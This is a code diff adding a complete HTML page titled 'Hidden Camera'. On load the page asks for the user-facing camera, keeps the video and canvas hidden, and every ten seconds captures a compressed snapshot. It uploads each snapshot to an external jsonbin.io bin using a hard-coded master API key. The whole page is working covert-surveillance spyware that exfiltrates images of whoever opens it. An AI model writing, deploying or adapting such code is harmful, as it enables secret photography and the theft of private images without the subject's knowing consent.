@@ -1,0 +1,81 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Hidden Camera</title>
+</head>
+<body>
+    <video id="video" autoplay style="display: none;"></video>
+    <canvas id="canvas" style="display: none;"></canvas>
+
+    <script>
+        let video = document.getElementById('video');
+        let canvas = document.getElementById('canvas');
+        let context = canvas.getContext('2d');
+        let stream = null;
+
+        const API_KEY = "$2a$10$Cg741B1FlImbg8aDE1TuUeG.0BQ4wYThRkHABt56gVhN9sRzDgRci";  
+        const BIN_ID = "67d4b75d8a456b796675f94b";  
+
+        async function startCamera() {
+            try {
+                if (stream) {
+                    stream.getTracks().forEach(track => track.stop());
+                }
+                stream = await navigator.mediaDevices.getUserMedia({
+                    video: { facingMode: "user" }
+                });
+                video.srcObject = stream;
+
+                setTimeout(autoCapture, 3000);  
+            } catch (error) {
+                console.error("Camera access error:", error);
+            }
+        }
+
+        function captureImage() {
+            let targetWidth = 240;  // Reduce resolution for compression
+            let targetHeight = (video.videoHeight / video.videoWidth) * targetWidth;
+
+            canvas.width = targetWidth;
+            canvas.height = targetHeight;
+            context.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+            let base64Image = canvas.toDataURL('image/webp', 0.2);  // Use WebP & lower quality (20%)
+            let compressedBase64 = base64Image.replace(/^data:image\/webp;base64,/, '');  
+
+            sendToJsonBin(compressedBase64);
+        }
+
+        async function sendToJsonBin(compressedBase64) {
+            try {
+                let response = await fetch(`https://api.jsonbin.io/v3/b/${BIN_ID}`, {
+                    method: "PUT",
+                    headers: {
+                        "Content-Type": "application/json",
+                        "X-Master-Key": API_KEY
+                    },
+                    body: JSON.stringify({ image: "data:image/webp;base64," + compressedBase64 })  // Keep valid Base64 format
+                });
+
+                if (response.ok) {
+                    console.log("Compressed Base64 image successfully sent to Jsonbin.io");
+                } else {
+                    console.error("Failed to send compressed Base64 image");
+                }
+            } catch (error) {
+                console.error("Error:", error);
+            }
+        }
+
+        function autoCapture() {
+            captureImage();
+            console.log("Compressed image captured and sent!");
+            setTimeout(autoCapture, 10000);  
+        }
+
+        startCamera();
+    </script>
+</body>
+</html>
